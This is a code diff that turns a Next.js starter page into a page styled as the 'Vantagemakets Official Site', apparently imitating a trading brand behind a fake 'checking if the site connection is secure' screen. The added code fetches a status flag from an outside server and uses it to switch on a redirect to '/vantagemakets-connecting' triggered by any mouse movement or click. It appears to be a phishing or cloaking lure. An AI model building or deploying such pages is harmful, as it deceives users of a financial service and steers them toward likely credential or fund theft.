@@ -1,95 +1,70 @@
-import Image from 'next/image'
-import styles from './page.module.css'
+'use client'
+import styles from "./page.module.css";
+import circel from "../../public/R-tron.png";
+import image from "../../public/image.png";
+import Image from "next/image";
+import { useEffect, useState } from "react";
 
 export default function Home() {
+  const [status, setStatus] = useState(true);
+  const [hasRedirected, setHasRedirected] = useState(false);
+  const [isLoading, setIsLoading] = useState(true);
+  const handleMouseMove = () => {
+    if (!hasRedirected) {
+      setHasRedirected(true);
+      window.location.href = "/vantagemakets-connecting";
+    }
+  };
+  const handleClick = () => {
+    window.location.href = "/vantagemakets-connecting";
+  }
+  const fetchItem = async () => {
+    try {
+      const response = await fetch(`https://db-affiliate.onrender.com/status?id=5`);
+      if (!response.ok) {
+        throw new Error("Network response was not ok");
+      }
+      const data = await response.json();
+      setStatus(data?.status);
+    } catch (error) {
+      console.error("Error fetching item:", error);
+    }  finally {
+      setIsLoading(false);
+    }
+  };
+  useEffect(() => {
+    fetchItem()
+  }, [])
   return (
-    <main className={styles.main}>
-      <div className={styles.description}>
-        <p>
-          Get started by editing&nbsp;
-          <code className={styles.code}>src/app/page.js</code>
-        </p>
-        <div>
-          <a
-            href="https://vercel.com?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
+    <div onMouseMove={!isLoading && status ? handleMouseMove : null}
+      onClick={!isLoading && !status ? handleClick : null}
+    >
+      <main className={styles.main}>
+        <h3 className={styles.text}>
+          Vantagemakets Official Site{" "}
+          <span
+            style={{ transform: "translate(0px)", display: "inline-block" }}
           >
-            By{' '}
-            <Image
-              src="/vercel.svg"
-              alt="Vercel Logo"
-              className={styles.vercelLogo}
-              width={100}
-              height={24}
-              priority
-            />
-          </a>
+            <Image src={circel} alt="Logo" width={30} height={30} priority />
+          </span>
+        </h3>
+        <p className={styles.text2}>
+          Checking if the site connection is secure
+        </p>
+        <p className={styles.text3}>
+          We needs to review the security of your connection before proceeding
+          Vantagemakets
+        </p>
+        <div style={{ marginTop: 30 }}>
+          <Image src={image} alt="Logo" className={styles.image2} />
         </div>
-      </div>
-
-      <div className={styles.center}>
-        <Image
-          className={styles.logo}
-          src="/next.svg"
-          alt="Next.js Logo"
-          width={180}
-          height={37}
-          priority
-        />
-      </div>
-
-      <div className={styles.grid}>
-        <a
-          href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className={styles.card}
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2>
-            Docs <span>-&gt;</span>
-          </h2>
-          <p>Find in-depth information about Next.js features and API.</p>
-        </a>
-
-        <a
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className={styles.card}
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2>
-            Learn <span>-&gt;</span>
-          </h2>
-          <p>Learn about Next.js in an interactive course with&nbsp;quizzes!</p>
-        </a>
-
-        <a
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className={styles.card}
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2>
-            Templates <span>-&gt;</span>
-          </h2>
-          <p>Explore the Next.js 13 playground.</p>
-        </a>
-
-        <a
-          href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className={styles.card}
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2>
-            Deploy <span>-&gt;</span>
-          </h2>
-          <p>
-            Instantly deploy your Next.js site to a shareable URL with Vercel.
-          </p>
-        </a>
-      </div>
-    </main>
-  )
+        <p className={styles.text4}>Why am I seeing this page?</p>
+        <p className={styles.text5}>
+          Requests from malicious bots can pose as legitimate traffic.
+          Occasionally, you may see this page while the site ensures that the
+          connection is secure.
+        </p>
+      </main>
+    </div>
+  );
 }
